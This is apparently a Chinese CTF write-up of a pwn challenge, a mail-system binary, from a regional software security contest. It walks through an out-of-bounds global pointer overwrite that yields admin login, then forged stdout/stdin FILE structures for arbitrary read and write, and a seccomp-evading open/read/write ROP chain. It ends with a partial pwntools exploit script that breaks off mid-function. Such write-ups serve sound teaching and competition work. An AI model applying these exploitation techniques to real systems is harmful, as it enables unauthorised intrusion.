---
title: 软件系统安全赛-pwn题
url: https://mp.weixin.qq.com/s/1jojbR6M8auza8i7n2Vbiw
source: Doonsec's feed
date: 2026-03-14
fetch_date: 2026-03-15T04:27:06.169316
---

# 软件系统安全赛-pwn题

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2AAMh9HmvsRUFAM2CficLibJ4yGllSQ7icrpNpfcc9kTeLpk75YHjYPvvd2vGVheBCM7dyQ6tYtTmF8N6j9YbErgkhsGdIEiaOsU1niafG3tNNP4/0?wx_fmt=jpeg)

# 软件系统安全赛-pwn题

原创

wallkone
wallkone

星络安全实验室

![]()

在小说阅读器中沉浸阅读

|  |
| --- |
| 免责声明:文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，未授权的攻击属于非法行为!文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责作者不为此承担任何责任，一旦造成后果请自行负责 |

软件系统安全赛西南赛区初赛(部分WP解析)

pwn

整体来说比赛难度不算很高，最后只剩一个web没出，主要卡在提权，pwn题很有质量，重点看看pwn题

## 一、保护与程序结构

对 ELF 做基础分析，可以得到：

* `Full RELRO`
* `Canary found`
* `NX enabled`
* `PIE enabled`
* 使用了 `libseccomp`

seccomp 规则在初始化函数里设置，只禁止了：

* `execve(59)`
* `execveat(322)`

因此：

* 不能直接走 `system("/bin/sh")`
* 更适合走 `open/read/write` 的 ORW 链

程序逻辑上是一个“邮件系统”，有：

* 普通用户菜单：写草稿、读收件箱、发信、登出
* 管理员菜单：改用户、删用户、代发邮件、用户间转发邮件

管理员密码不是写死在静态字符串里，而是：

* 用户名固定为 `admin`
* 密码在启动时从 `/dev/urandom` 读取 16 字节
* 校验数据保存在 `qword_70C0` 指向的 0x400 块里

所以直接爆管理员密码不可行，需要先拿到内存破坏原语。

---

## 二、核心漏洞点

### 1. 注册逻辑中的计数与槽位扫描不一致

关键函数：`sub_181B`

伪代码核心：

```
 v2=0;
 for (i=0; i<=11; ++i) {
     if (qword_7060[i] &&*(qword_7060[i] +632) !=0)
         ++v2;
 }

 if (v2<=7) {
     for (j=0; ; ++j) {
         if (j>12)
             return-1;
         if (!qword_7060[j] ||*(qword_7060[j] +904) !=1)
             break;
     }
     qword_7060[j] =malloc(0x410);
     memset(qword_7060[j], 0, 0x410);
     *(qword_7060[j] +632) =j+1;
     *(qword_7060[j] +904) =1;
     returnj;
 }
```

这里有一个非常关键的逻辑错位：

* **注册人数统计**看的是 `user_id != 0`，偏移 `+632`
* **槽位是否可复用**看的是 `active != 1`，偏移 `+904`

这意味着如果一个用户对象满足：

* `user_id == 0`
* `active == 1`

那么它：

* **不会被计入当前注册人数**
* **却仍然占据一个槽位**

一旦我们制造出多个这样的“僵尸用户”，就能造成：

* 统计上“人数没满”
* 实际上 12 个槽位都被占着

于是扫描可用槽位时，会一路扫到 `j == 12`，从而发生：

```
 qword_7060[12] =malloc(0x410)
```

而 `qword_7060` 实际只有 12 个元素，下标范围是 `0..11`。

这就形成了 **OOB 全局指针覆盖**。

---

### 2. 封禁逻辑恰好能制造“僵尸用户”

关键函数：`sub_1429`

当某个用户在 10 秒内发信次数超过阈值时，会触发封禁：

```
 if (v2-last_time<=10&&send_count>4) {
     user->name="illegal";
     randomize(user->password);
     user->user_id=0;
     puts("Account has been banned!");
 }
```

注意这里：

* `user_id` 被置零
* 但 `active` 并没有清掉
* 堆块也没有释放

因此封禁后的用户正好变成：

* `user_id == 0`
* `active == 1`

也就是上一步所需的“僵尸用户”。

---

### 3. OOB 覆盖的目标恰好是管理员认证块指针

程序初始化时：

* `qword_7060` 存放用户指针数组
* 紧邻其后是 `qword_70C0`
* `qword_70C0` 指向管理员认证信息块

注册扫描越界到 `qword_7060[12]` 时，实际写到的就是：

```
 qword_70C0=malloc(0x410)
 memset(qword_70C0, 0, 0x410)
```

管理员校验函数 `sub_1B9D` 的逻辑是：

```
 if (strcmp(input_name, qword_70C0+50) ==0) {
     if (!strncmp(input_pass, qword_70C0+104, 0x10)) {
         puts("Welcome admin!");
         return1;
     }
 }
```

也就是说：

* 管理员用户名在 `qword_70C0 + 50`
* 管理员密码前 16 字节在 `qword_70C0 + 104`

而 OOB 覆盖后，这个新块是 `memset(0)` 的。

因此只要输入：

* 用户名：`"\x00"`
* 密码：`"\x00"`

就能通过：

* `strcmp("", "") == 0`
* `strncmp("", "", 0x10) == 0`

成功进入管理员菜单。

---

### 4. 管理员“用户转发”功能存在负索引

关键函数：`sub_2CD6`

这个函数会让管理员输入：

* 源用户 ID
* 目标用户 ID
* 选择转发源（草稿 / 收件箱）

它对用户 ID 的检查是：

```
 if (v1>12) fail;
 if (v2>12) fail;
```

但是没有检查：

```
 v1<=0
 v2<=0
```

而后面实际使用时是：

```
 subeax, 1
 cdqe
 leardx, [rax*8]
 learax, qword_7060
 movrax, [rdx+rax]
```

这里的 `cdqe` 会把负数扩展成负偏移，因此我们可以用：

* `src = -3`、`dst = 7`
* `dst = -7`
* `dst = -5`

把 `qword_7060` 前方的全局指针当作用户对象来读写。

在这题里非常关键的几个负索引是：

* `-3` -> `stderr`
* `-5` -> `stdin`
* `-7` -> `stdout`

于是可以构造：

* 任意地址泄露
* `stdin` 伪造任意写

---

## 三、利用思路总览

整条利用链分成两个阶段：

### Stage 1：拿管理员权限

1. 先注册一个 `recv` 用户作为收件人
2. 再注册 `u1..u7`
3. 让 `u1..u5` 在 10 秒内各自触发封禁，制造 5 个“僵尸用户”
4. 在过程中穿插注册 `u8..u11`
5. 再封禁一个活用户，腾出“注册人数统计额度”
6. 第 13 次注册触发 OOB，覆盖 `qword_70C0`
7. 用 `\x00 / \x00` 登录管理员

### Stage 2：泄露 + 栈返回地址覆盖 + ORW

1. 用 `src = -3 -> dst = 7 -> 选择 draft`，把 `stderr` 附近内容转发给 `u7`

* 从而泄露 libc 基址

2. 用 `stdout` 任意泄露原语泄露 `environ`

* 得到当前线程环境变量指针

3. 动态计算 admin 菜单函数 `sub_3220` 的保存返回地址槽位
4. 伪造 `stdin` 结构，把下一次 `scanf` 的输入重定向到该返回地址附近
5. 发送一段 ORW ROP：

* `open(flag)`
* `read(fd, buf, 0x40)`
* `write(1, buf, 0x40)`

6. 选择管理员菜单项 `5`，让 `sub_3220` 正常 `return`，直接跳到 ROP 链

---

## 四、为什么最终选择覆盖 `sub_3220` 的返回地址

一开始比较自然的思路是：

* 覆盖当前 `scanf` 的返回地址

但实测这条链在远程上不够稳定，容易因为当前 libc 栈帧、stdio 缓冲和菜单状态不同而偏移不一致。

后来通过泄露 `environ` 附近一整段栈，动态观察远程栈上的 PIE 返回地址，发现：

* `sub_3220` 自身的保存返回地址相对 `environ` 的偏移更稳定
* 远程环境下最终成功的偏移是：

```
 environ - 0x1c0
```

这一点和本地的：

```
 environ - 0x1b8
```

存在差异，所以远程脚本必须以远程泄露结果为准，不能死套本地固定值。

## 五、关键利用细节

### 1. libc 泄露

使用：

* `src = -3`
* `dst = 7`
* 选择 `draft`

把 `stderr` 指针附近的内容拷进用户 7 的 inbox。

随后登录 `u7`，进入收件箱读取，得到 6 字节泄露：

```
 libc.address=leak- (_IO_2_1_stdout_+0x83)
```

---

### 2. `stdout` 任意地址泄露

把 `stdout` 覆盖为一份伪造 `_IO_FILE`：

```
 payload=flat(
     0xfbad1800,
     0, 0, 0,
     addr,
     addr+size,
     addr+size,
     addr,
     addr+size,
 )
```

然后通过管理员“用户转发”：

* `src = userX`
* `dst = -7`（即 `stdout`）
* 选择 `inbox mail`

就能把任意地址内容当作标准输出打出来。

这一步分别用于：

* 泄露 `environ`
* 泄露 `environ` 附近一整块栈内容

---

### 3. `stdin` 任意写

同理，负索引写到 `-5`，也就是 `stdin`。

构造一个伪造的 `stdin`：

* `_IO_read_ptr/_end/_base` 等字段都指向目标地址
* 这样下一次 `scanf` 底层就会把输入写进我们指定的位置

最终把目标定位到：

```
 ret_slot = environ - 0x1c0
```

然后发送：

* 第一字节：`'5\n'`

+ 让管理员菜单正常选择 `Logout`

* 后面紧跟 ORW ROP
* 最后接上字符串 `flag\x00`

这样 `sub_3220` 在正常打印：

```
 Logging out as admin...
```

后执行 `ret` 时，就直接跳进我们的 ORW 链。

最后exp

```
#!/usr/bin/env python3import argparseimport reimport socketimport time
import socksfrom pwn import ELF, context, flat, p64, remote, u64

context.log_level = "error"context.arch = "amd64"context.timeout = 12

HOST = ""PORT =
PROXY_HOST = ""PROXY_PORT = PROXY_USER = ""PROXY_PASS = ""

def start(host: str, port: int, proxy_host: str, proxy_port: int, proxy_user: str, proxy_pass: str):    socks.set_default_proxy(        socks.SOCKS5,        proxy_host,        proxy_port,        username=proxy_user,        password=proxy_pass,        rdns=True,    )    socket.socket = socks.socksocket    return remote(host, port)

def init_target(io):    io.send(open("prefix.bin", "rb").read())    io.recvuntil(b"=== Admin Menu ===")    io.recvuntil(b"Your choice: ")

def admin_forward(io, src: int, dst: int, which: int):    io.sendline(b"4")    io.sendlineafter(b"(1-12) ", str(src).encode())    io.sendlineafter(b"(1-12): ", str(dst).encode())    io.sendlineafter(b"Your choice: ", str(which).encode())    return io.recvuntil(b"Your choice: ")

def admin_mail(io, uid: int, data: bytes):    io.sendline(b"3")    io.sendlineafter(b"(1-12)", str(uid).encode())    io.sendlineafter(b"(1-256): ", str(len(data)).encode())    io.sendafter(b"bytes):\n", data)    return io.recvuntil(b"Your choice: ")

def login_user(io, name: bytes, password: bytes = b"p"):    io.sendline(b"1")    io.sendlineafter(b"Input your name: ", name)    io.sendlineafter(b"Input your password: ", password)    return io.recvuntil(b"Your choice: ")

def login_admin(io):    io.sendline(b"1")    io.sendlineafter(b"Input your name: ", b"\x00")    io.sendlineafter(b"Input your password: ", b"\x00")    io.recvuntil(b"=== Admin Menu ===\n")    return io.recvuntil(b"Your choice: ")

def stdout_leak(io, addr: int, size: int, user: int = 8, confirm: bool = False) -> bytes:    payload = flat(0xFBAD1800, 0, 0, 0, addr, addr + size, addr + size, addr, addr + size)    admin_mail(io, user, payload)
    io.sendline(b"4")    io.sendlineafter(b"(1-12) ", str(user).encode())    io.sendlineafter(b"(1-12): ", b"-7")    if confirm:        io.recvuntil(b"(y/n): ")        io.sendline(b"y")    io.recvuntil(b"Your choice: ")    io.sendline(b"2")
    out = io.recvrepeat(3.0)    marker = b"Mail forwarded from index"    idx = out.find(marker)    if idx == -1:        raise RuntimeError(f"stdout leak failed: {out[-200:]!r}")    return out[idx - size : idx]

def leak_libc(io, libc_elf: ELF) -> int:    admin_forward(io, -3, 7, 1)
    io.sendline(b"5")    io.recvuntil(b"Your choice: ")
    login_user(io, b"u7")    io.sendline(b"2")    io.sendlineafter(b"Your choice: ", b"2")
    out = io.recvuntil(b"What would you like to read?")    idx = out.find(b"Inbox (new mail):\n")    if idx == -1:        raise RuntimeError("failed to locate libc leak in user7 inbox")
    lea...